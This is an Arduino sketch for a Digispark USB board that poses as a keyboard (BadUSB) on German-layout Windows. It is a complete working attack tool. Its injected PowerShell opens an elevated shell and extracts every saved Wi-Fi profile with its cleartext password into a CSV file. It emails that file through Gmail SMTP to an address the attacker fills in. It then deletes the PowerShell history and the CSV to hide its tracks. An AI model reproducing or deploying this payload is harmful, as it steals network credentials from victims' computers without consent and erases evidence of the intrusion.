#include <DigiKeyboard.h>
#include "DigiKeyboardDe.h"


void setup() {
}

void loop() {
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_A);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.print(F("netsh wlan show profiles | Select-String ':(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Schl"));
  DigiKeyboard.sendKeyStroke(47);
  DigiKeyboardDe.print(F("sselinhalt.*:(.+)$'|  %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv temp.csv;exit"));
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(3000);
  DigiKeyboardDe.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_A);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.print(F("$Username = '<EMAIL_BENUTZERNAME>';$Password = 'EMAIL_PASSWORT';$pass = ConvertTo-SecureString -AsPlainText $Password -Force;$SecureString = $pass;$MySecureCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$SecureString; $From = '<ABSENDER_EMAILADRESSE>';$To = 'EMPFÄNGER_EMAILADRESSE';$Attachment = 'temp.csv';$Subject = 'Digispark Wlan';$Body = 'Wifi Passwörter im Anhang';$SMTPServer = 'smtp.gmail.com';$SMTPPort = '587';Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl -Credential $MySecureCreds -Attachments $Attachment;exit"));
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_A);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.print("cmd");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.print(F("del temp.csv"));
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(100);
  DigiKeyboardDe.print(F("exit"));
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*empty*/
  }
}
